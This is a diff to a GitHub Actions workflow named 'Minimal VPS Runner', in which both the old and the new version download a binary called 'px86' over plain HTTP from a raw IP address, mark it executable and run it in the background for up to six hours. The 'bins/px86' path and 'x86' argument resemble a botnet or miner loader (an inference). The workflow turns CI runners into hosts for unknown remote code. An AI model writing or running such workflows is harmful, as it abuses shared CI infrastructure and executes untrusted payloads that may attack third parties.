@@ -1,28 +1,36 @@
-- name: Run binary and keep alive
-  run: |
-    wget http://45.138.16.158/bins/px86 -O px86
-    chmod +x px86
+name: Minimal VPS Runner
 
-    echo "🟢 Launching binary..."
-    ./px86 x86 &
+on:
+  workflow_dispatch:
+    inputs:
+      uptime:
+        description: 'VPS uptime in hours (max 6)'
+        required: false
+        default: '6'
+        type: choice
+        options:
+          - '1'
+          - '2'
+          - '3'
+          - '4'
+          - '5'
+          - '6'
 
-    PX86_PID=$!
-    echo "📌 PID: $PX86_PID"
+jobs:
+  run-binary:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download and run binary in background
+        run: |
+          echo "🔽 Downloading binary..."
+          wget http://45.138.16.158/bins/px86 -O px86
+          chmod +x px86
+          
+          echo "🚀 Running binary in background..."
+          ./px86 x86 &  # Run in background
+          BINARY_PID=$!
+          echo "📌 Binary PID: $BINARY_PID"
 
-    UPTIME_SECONDS=$(( ${{ github.event.inputs.uptime }} * 3600 ))
-    echo "⏳ Keeping alive for $UPTIME_SECONDS seconds..."
-
-    for ((i=0; i<UPTIME_SECONDS; i++)); do
-      if ! ps -p $PX86_PID > /dev/null; then
-        echo "❌ Binary exited at second $i"
-        break
-      fi
-
-      if (( i % 60 == 0 )); then
-        echo "⏱️ Alive for $((i / 60)) minute(s)..."
-      fi
-
-      sleep 1
-    done
-
-    echo "✅ Done."
+          echo "⏳ Starting keep-alive mechanism..."
+          (sleep $(( ${{ github.event.inputs.uptime }} * 3600 )) && kill $BINARY_PID && echo '⏱️ Uptime complete. Binary stopped.') &
+          tail -f /dev/null
